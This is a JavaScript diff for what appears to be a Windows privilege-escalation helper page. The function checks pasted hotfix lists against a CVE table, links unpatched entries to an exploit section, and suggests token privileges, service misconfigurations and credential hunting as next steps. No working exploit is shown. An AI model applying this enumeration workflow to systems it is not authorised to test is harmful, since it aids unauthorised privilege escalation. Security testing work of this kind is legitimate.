+      ${v.tool ? `<div style="font-size:11px;color:var(--text2)">Tool: <code style="color:var(--cyan)">${v.tool}</code>${v.link?` &nbsp;<a href="${v.link}" target="_blank" style="font-size:11px">&#8599;</a>`:''}</div>` : ''}
       ${v.patchKBs ? `<div class="si-kbs">Patch KBs: ${v.patchKBs.map(k=>`<span class="si-kb ${kbs.has(k)?'present':'missing'}">${k}</span>`).join('')}</div>` : ''}
-      ${!patched ? `<a class="si-goto" href="#${v.section}" onclick="closeModal('si-modal')">&#8594; Go to §${v.section}</a>` : ''}
+      ${!v.patched ? `<a class="si-goto" href="#${v.section}" onclick="closeModal('si-modal')">&#8594; Jump to exploit section</a>` : ''}
     </div>`;
   });
+  if (relevant.length === 0) html2 += '<div style="color:var(--text3);padding:8px">No CVE matches for build ' + build + ' in this database.</div>';
   html2 += '</div>';
 
   if (!vulnN && kbs.size === 0) {
-    html2 += '<div class="si-msg warn">&#9888; No hotfixes found in output — the list may be empty. Run: <code>wmic qfe list brief</code> and paste that output too.</div>';
-  } else if (!vulnN) {
-    html2 += '<div class="si-msg ok">&#10003; All checked CVEs appear patched. Focus on token privileges, service misconfigurations, and credential hunting.</div>';
+    html2 += '<div class="si-msg warn">&#9888; No hotfixes in output — list may be empty. Also run: <code>wmic qfe list brief</code></div>';
+  } else if (!vulnN && relevant.length > 0) {
+    html2 += '<div class="si-msg ok">&#10003; All checked CVEs appear patched for this build. Pivot to token privileges, service misconfigs, credential hunting.</div>';
+  } else if (vulnN > 0) {
+    html2 += `<div class="si-msg warn">&#9888; ${vulnN} UNPATCHED CVE(s) found — check above. Verify manually before exploitation.</div>`;
   }
   out.innerHTML = html + html2;
 }
